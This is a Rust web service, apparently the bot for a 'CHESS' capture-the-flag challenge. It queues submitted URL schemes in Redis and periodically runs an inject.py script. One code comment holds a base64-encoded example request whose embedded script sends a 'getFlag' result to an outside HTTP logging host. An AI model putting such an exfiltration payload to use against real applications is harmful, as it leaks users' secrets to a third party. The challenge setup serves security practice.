use std::collections::HashMap;
use warp::Filter;
extern crate redis;
use anyhow::Error;
use job_scheduler::{Job, JobScheduler};
use md5::{Digest, Md5};
use redis::{Client, Commands, RedisError};
use serde::{Deserialize, Serialize};
use serde_json;
use std::process::Command;
use std::thread;
use std::time::Duration;
use std::time::{SystemTime, UNIX_EPOCH};

const CHESS_TASK_QUEUE: &str = "m_CHESS_TASK_QUEUE";
const CHESS_TASK_QUEUE_DONE: &str = "m_CHESS_TASK_QUEUE_DONE";

const CHESS_LOGO: &str = "
 ██████╗██╗  ██╗███████╗███████╗███████╗
██╔════╝██║  ██║██╔════╝██╔════╝██╔════╝
██║     ███████║█████╗  ███████╗███████╗
██║     ██╔══██║██╔══╝  ╚════██║╚════██║
╚██████╗██║  ██║███████╗███████║███████║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 ";

// http://127.0.0.1:1024/chess?urlscheme=Y2hlc3M6Ly93d3cuYmFpZHUuY29t
// http://127.0.0.1:1024/chess?urlscheme=Y2hlc3M6Ly93d3cuYXBwbGUuY29t
// http://127.0.0.1:1024/chess?urlscheme=Y2hlc3M6Ly94P3VybFR5cGU9d2ViJnVybD1kYXRhJTNBdGV4dCUyRmh0bWwlM0IlMkMlMjUzQ3NjcmlwdCUyNTIwdHlwZSUyNTNEJTI1MjJhcHBsaWNhdGlvbiUyNTJGamF2YXNjcmlwdCUyNTIyJTI1M0UlMjUyOGZ1bmN0aW9uJTI1MjBwYXlsb2FkJTI1MjglMjUyOSUyNTIwJTI1N0IlMjUyMCUyNTIwJTI1MEElMjUyMCUyNTIwdmFyJTI1MjB4aHIlMjUyMCUyNTNEJTI1MjBuZXclMjUyMFhNTEh0dHBSZXF1ZXN0JTI1MjglMjUyOSUyNTNCJTI1MjB4aHIub3BlbiUyNTI4JTI1MjdHRVQlMjUyNyUyNTJDJTI1MjAlMjUyN2h0dHAlMjUzQSUyNTJGJTI1MkZodHRwbG9nLmNvZGVycHViLmNvbSUyNTJGaHR0cGxvZyUyNTJGdGVzdCUyNTNGZmxhZyUyNTNEJTI1MjclMjUyMCUyNTJCJTI1MjB3bWN0Zi4lMjUyNF9nZXRGbGFnJTI1MjglMjUyOSUyNTJDJTI1MjBmYWxzZSUyNTI5JTI1M0IlMjUyMHhoci5zZW5kJTI1MjglMjUyOSUyNTNCJTI1MEElMjU3RCUyNTI5JTI1MjglMjUyOSUyNTNDJTI1MkZzY3JpcHQlMjUzRQ==
// http://127.0.0.1:1024/query?task_id=11

#[derive(Serialize, Deserialize, Debug)]
pub struct ChessTask {
    task_id: String,
    payload: String,
    timestamp: String,
    status: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Response {
    status: String,
    data: String,
}

pub struct RedisConnection {
    client: Client,
}

impl RedisConnection {
    pub fn connect(url: String) -> Result<Self, RedisError> {
        let client = Client::open(url)?;
        Ok(Self { client })
    }

    pub fn push_task(&self, payload: &String) -> Result<(), RedisError> {
        let mut connection = self.client.get_connection()?;
        connection.lpush(CHESS_TASK_QUEUE, payload)
    }

    pub fn query_task(&self, task_id: &String) -> Result<ChessTask, Error> {
        let mut connection = self.client.get_connection().map_err(Error::from)?;

        let len: isize = connection.llen(CHESS_TASK_QUEUE_DONE)?;
        let mut index = 0;
        while index as u32 != len as u32 {
            let json_str: String = connection.lindex(CHESS_TASK_QUEUE_DONE, index)?;
            let json: ChessTask = serde_json::from_str(&json_str)?;
            if task_id.eq(&json.task_id) {
                return Ok(json);
            }
            index += 1;
        }
        return Err(Error::msg(format!(
            "CHESS ERROR: con't find task: {}!",
            task_id
        )));
    }
}

impl Clone for RedisConnection {
    fn clone(&self) -> Self {
        Self {
            client: self.client.clone(),
        }
    }
}

fn get_timestamp() -> u128 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_millis()
}

fn get_task_key() -> String {
    let time = get_timestamp();
    let mut hasher = Md5::new();
    let s_time = format!("{}{}{}", "y1HW30dTeu", time, "vstKDOukCN");
    hasher.update(s_time);
    hex::encode(hasher.finalize())
}

fn run() {
    // 定时脚本
    println!("定时脚本启动");
    let mut sched = JobScheduler::new();

    sched.add(Job::new("1/5 * * * * *".parse().unwrap(), move || {
        exec_cmd();
    }));

    loop {
        sched.tick();

        std::thread::sleep(Duration::from_millis(500));
    }
}

fn exec_cmd() {
    let cmd = "python3";
    let file = "inject.py";

    let _output = Command::new(cmd)
        .arg(file)
        .output()
        .expect("CHESS ERROR: failed to run command!");
    // Ok(String::from("_"))

    // let output = Command::new("pwd")
    // .output().expect("CHESS ERROR: failed to run command!");
    // Ok(String::from_utf8(output.stdout).unwrap())
    // println!("{}", String::from_utf8(output.stdout).unwrap());
}

#[tokio::main]
async fn main() {
    println!("{CHESS_LOGO}");

    let redis = RedisConnection::connect("redis://127.0.0.1:6379".to_string()).unwrap();
    let chess = warp::get()
        .and(warp::path("chess"))
        .and(warp::query::<HashMap<String, String>>())
        .map(move |p: HashMap<String, String>| match p.get("urlscheme") {
            Some(urlscheme) => {
                let task_id = get_task_key();
                let task = ChessTask {
                    task_id: (&task_id).to_string(),
                    // payload: base64::encode(urlscheme),
                    payload: urlscheme.to_string(),
                    timestamp: get_timestamp().to_string(),
                    status: "0".to_string(),
                };
                let payload = serde_json::to_string(&task).unwrap();
                let result = RedisConnection::push_task(&redis, &payload);
                match result {
                    Ok(_) => {
                        let response = Response {
                            status: "200".to_string(),
                            data: format!(
                                "CHESS SCUESS: The task {} has been submitted, please check later!",
                                task_id
                            ),
                        };
                        return serde_json::to_string(&response).unwrap();
                    }
                    Err(e) => {
                        let response = Response {
                            status: "500".to_string(),
                            data: format!("CHESS ERROR: redis insert error: {}", e.to_string()),
                        };
                        return serde_json::to_string(&response).unwrap();
                    }
                }
            }
            None => {
                let response = Response {
                    status: "500".to_string(),
                    data: String::from("CHESS ERROR: can not find urlscheme!"),
                };
                return serde_json::to_string(&response).unwrap();
            }
        });

    let redis = RedisConnection::connect("redis://127.0.0.1:6379".to_string()).unwrap();
    let query = warp::get()
        .and(warp::path("query"))
        .and(warp::query::<HashMap<String, String>>())
        .map(move |p: HashMap<String, String>| match p.get("task_id") {
            Some(task_id) => {
                let result = RedisConnection::query_task(&redis, task_id);
                match result {
                    Ok(task) => {
                        let response = Response {
                            status: "200".to_string(),
                            data: format!(
                                "CHESS SCUESS: The task {} you submitted has been completed!",
                                task.task_id
                            ),
                        };
                        return serde_json::to_string(&response).unwrap();
                    }
                    Err(_) => {
                        let response = Response {
                            status: "500".to_string(),
                            data: format!(
                                "CHESS ERROR: The task is still in the queue, please check later!"
                            ),
                        };
                        return serde_json::to_string(&response).unwrap();
                    }
                }
            }
            None => {
                let response = Response {
                    status: "500".to_string(),
                    data: String::from("CHESS ERROR: can not find task_id!"),
                };
                return serde_json::to_string(&response).unwrap();
            }
        });

    thread::spawn(run);

    warp::serve(chess.or(query)).run(([0, 0, 0, 0], 1024)).await;
}
